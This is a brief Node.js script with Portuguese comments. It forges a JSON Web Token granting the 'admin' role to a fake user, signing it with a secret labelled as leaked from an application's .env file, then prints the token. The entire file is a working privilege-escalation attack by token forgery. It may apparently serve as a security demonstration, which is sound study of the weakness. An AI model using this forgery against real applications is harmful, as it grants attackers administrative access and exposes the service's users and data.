const jwt = require('jsonwebtoken');

// Payload malicioso
const payload = { 
  sub: "usuario_falso_123", 
  email: "hacker@loja.com", 
  role: "admin", 
  name: "Administrador Falso" 
};

// A chave que vazou do .env
const segredoVazado = "CHAVE ENV VAZADA: JWT";

const tokenFalso = jwt.sign(payload, segredoVazado);

console.log(tokenFalso);
